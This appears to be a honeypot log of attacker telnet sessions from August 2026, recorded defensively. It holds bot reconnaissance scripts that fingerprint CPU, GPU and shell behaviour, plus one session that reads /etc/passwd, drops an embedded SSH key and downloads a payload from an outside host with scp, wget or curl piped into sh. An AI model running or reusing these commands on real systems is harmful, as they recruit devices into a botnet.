2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+[ -f /proc/version ]
+( [ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session d3ca3243eb8c | src_ip 165.22.2.XYZ | 2026-08-31T07:52:39.506315Z ===
+/bin/./uname -s -v -n -r -m
+
+=== session 8b6c21e660fb | src_ip 119.115.250.XYZ | 2026-08-31T08:09:47.106649Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x48\x4c\x4d\x51\x48'
+
+=== session 203b3968b59b | src_ip 119.115.250.XYZ | 2026-08-31T08:09:55.981597Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x48\x4c\x4d\x51\x48'
+
+=== session ad319e7a7f76 | src_ip 119.115.250.XYZ | 2026-08-31T08:10:36.476510Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x48\x4c\x4d\x51\x48'
+
+=== session 949053aab08e | src_ip 119.115.250.XYZ | 2026-08-31T08:10:54.809939Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x48\x4c\x4d\x51\x48'
+
+=== session 76ec15109cd6 | src_ip 92.118.39.XYZ | 2026-08-31T08:22:21.925270Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session 897460a8b195 | src_ip 45.156.87.XYZ | 2026-08-31T08:24:33.243042Z ===
+uname -s -v -n -r -m
+
+=== session 3581a6f27e69 | src_ip 45.156.87.XYZ | 2026-08-31T08:25:02.401815Z ===
+uname -s -v -n -r -m
+
+=== session a85fbf00afb9 | src_ip 104.218.165.XYZ | 2026-08-31T08:38:26.701604Z ===
+
+
+=== session fe2cc3240cb2 | src_ip 153.117.13.XYZ | 2026-08-31T08:41:59.380045Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x45\x52\x46\x49\x49'
+
+=== session 04d44cc7bc00 | src_ip 153.117.13.XYZ | 2026-08-31T08:42:24.034625Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x45\x52\x46\x49\x49'
+
+=== session 197d6059858c | src_ip 153.117.13.XYZ | 2026-08-31T08:42:39.348587Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x45\x52\x46\x49\x49'
+
+=== session 54208daf1d2f | src_ip 45.156.87.XYZ | 2026-08-31T09:02:11.996023Z ===
+uname -s -v -n -r -m
+
+=== session 2b10ae24a3b0 | src_ip 45.156.87.XYZ | 2026-08-31T09:18:08.288172Z ===
+uname -s -v -n -r -m
+
+=== session d4bd58ac5a68 | src_ip 45.156.87.XYZ | 2026-08-31T09:19:47.393118Z ===
+uname -s -v -n -r -m
+
+=== session 84b6061398fb | src_ip 119.179.252.XYZ | 2026-08-31T10:45:19.061744Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x47\x51\x45\x41\x41\x4e'
+
+=== session 94c0110ae3f6 | src_ip 94.154.43.XYZ | 2026-08-31T10:50:11.106085Z ===
+uname -a ; echo 'vT'
+
+=== session 5eea1bac685f | src_ip 94.154.43.XYZ | 2026-08-31T10:50:21.169319Z ===
+uname -a ; echo 'vT'
+
+=== session 3c976804b0e2 | src_ip 27.215.86.XYZ | 2026-08-31T11:55:21.175205Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x57\x4d\x51\x5a\x52\x56'
+
+=== session 0880352891b9 | src_ip 27.215.86.XYZ | 2026-08-31T11:55:51.436852Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x57\x4d\x51\x5a\x52\x56'
+
+=== session 0d4caa048b87 | src_ip 139.135.40.XYZ | 2026-08-31T13:23:06.058443Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x55\x56\x47\x4f\x4b\x57'
+
+=== session 8a1e0d2e6982 | src_ip 139.135.40.XYZ | 2026-08-31T13:23:37.653430Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x55\x56\x47\x4f\x4b\x57'
+
+=== session 6685c5332e99 | src_ip 73.215.105.XYZ | 2026-08-31T15:04:17.059709Z ===
+echo TELNET_TEST_OK
+
+=== session 698a5740f65c | src_ip 104.155.37.XYZ | 2026-08-31T15:48:40.300369Z ===
+
+
+=== session 8f222c1793a4 | src_ip 34.77.177.XYZ | 2026-08-31T16:20:12.534480Z ===
+
+
+=== session d8bbdcf535a5 | src_ip 35.195.233.XYZ | 2026-08-31T17:03:09.564106Z ===
+
+
+=== session 6a031b3c2ad7 | src_ip 94.154.43.XYZ | 2026-08-31T17:15:49.085203Z ===
+uname -a ; echo 'vT'
+
+=== session ba2191b67297 | src_ip 111.45.29.XYZ | 2026-08-31T18:25:34.118306Z ===
+uname -s -m
+
+=== session a8000c91792f | src_ip 94.243.11.XYZ | 2026-08-31T18:30:45.207610Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x57\x48\x4e\x52\x48\x4a'
+
+=== session 8bc61bb066f4 | src_ip 103.187.9.XYZ | 2026-08-31T19:11:26.187528Z ===
+id
+cat /etc/passwd
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+enable
+system
+shell
+sh
+bash
+cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
+0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
+AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
+Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
+-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
+UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XYZ:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.XYZ/sh || curl -sk https://217.60.195.XYZ/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B"
+
+
+=== session 06ef6c13f692 | src_ip 139.135.45.XYZ | 2026-08-31T19:38:41.114305Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x4f\x46\x41\x4c\x4e'
+
+=== session da5cafe169df | src_ip 92.118.39.XYZ | 2026-08-31T20:42:44.348312Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+/bin/uname -s -v -n -m 2 > /dev/null
+uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session f00f583004d7 | src_ip 94.154.43.XYZ | 2026-08-31T23:31:30.521077Z ===
+echo SHELL_TEST
+
+=== session 2d05189b0b0e | src_ip 94.154.43.XYZ | 2026-08-31T23:31:53.289834Z ===
+echo SHELL_TEST
+/bin/busybox TEST
+
+=== session 742960460cef | src_ip 120.92.105.XYZ | 2026-08-31T23:38:45.726576Z ===
+uname -s -m
+
+=== session f46ba93f3cc2 | src_ip 80.94.93.XYZ | 2026-08-31T23:42:07.822828Z ===
+User-Agent: python-requests/2.27.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
